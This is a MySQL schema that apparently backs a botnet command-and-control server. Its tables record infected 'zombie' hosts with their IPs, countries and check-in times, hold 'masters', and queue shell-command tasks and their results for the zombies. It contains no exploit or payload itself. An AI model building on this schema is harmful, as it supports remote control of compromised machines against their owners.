use zgang;

/* tables */
CREATE TABLE Users (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
updated_at TIMESTAMP NOT NULL DEFAULT NOW() ON UPDATE NOW(),
username varchar(255) NOT NULL UNIQUE,
pswd varchar(60) NOT NULL,
public_ip varchar(15) NOT NULL,
country varchar(15) NOT NULL
);

CREATE TABLE Masters (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
updated_at TIMESTAMP NOT NULL DEFAULT NOW() ON UPDATE NOW(),
username varchar(255) NOT NULL UNIQUE,
public_key varchar(255) NOT NULL
);

CREATE TABLE Zombies (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
updated_at TIMESTAMP NOT NULL DEFAULT NOW() ON UPDATE NOW(),
last_seen timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
username varchar(255) NOT NULL UNIQUE,
os varchar(255),
current_public_ip varchar(15) NOT NULL,
current_country varchar(15) NOT NULL,
current_hostname varchar(255),
refresh_secs DOUBLE(8,1) UNSIGNED DEFAULT 10.5
);

CREATE TABLE AccessLogs (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
updated_at TIMESTAMP NOT NULL DEFAULT NOW() ON UPDATE NOW(),
username varchar(255) NOT NULL,
successful BOOLEAN NOT NULL,
public_ip varchar(15) NOT NULL,
country varchar(15),
hostname varchar(255)
);

CREATE TABLE Tasks (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
updated_at TIMESTAMP NOT NULL DEFAULT NOW() ON UPDATE NOW(),
task_name varchar(255) NOT NULL UNIQUE,
task_type varchar(255) DEFAULT 'cmd',
task_content LONGTEXT NOT NULL,
master_username varchar(255),
to_exec_at timestamp DEFAULT NOW(),
to_stop_at timestamp DEFAULT 0,
manual_stop  ENUM('true','false') DEFAULT 'false'
) ENGINE=InnoDB;

CREATE TABLE Missions (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
updated_at TIMESTAMP NOT NULL DEFAULT NOW() ON UPDATE NOW(),
task_id int(11) UNSIGNED NOT NULL,
zombie_username varchar(255) NOT NULL,
read_confirm ENUM('true','false') DEFAULT 'false',
running  ENUM('true','false') DEFAULT 'false',
result varchar(2048),
exec_at timestamp DEFAULT 0,
manual_stop  ENUM('true','false') DEFAULT 'false',
 CONSTRAINT fk_task_id
   FOREIGN KEY (task_id)
   REFERENCES Tasks(id)
     ON DELETE CASCADE
     ON UPDATE CASCADE
) ENGINE=InnoDB;


/* triggers */
CREATE TRIGGER update_ip_cc AFTER INSERT ON AccessLogs 
FOR EACH ROW
  UPDATE Zombies
     SET current_public_ip = NEW.public_ip, current_country = NEW.country, last_seen= NEW.created_at
   WHERE username = NEW.username;

CREATE TRIGGER update_manual_stop AFTER UPDATE ON Tasks 
FOR EACH ROW
  UPDATE Missions
     SET manual_stop = NEW.manual_stop
   WHERE task_id = NEW.id;
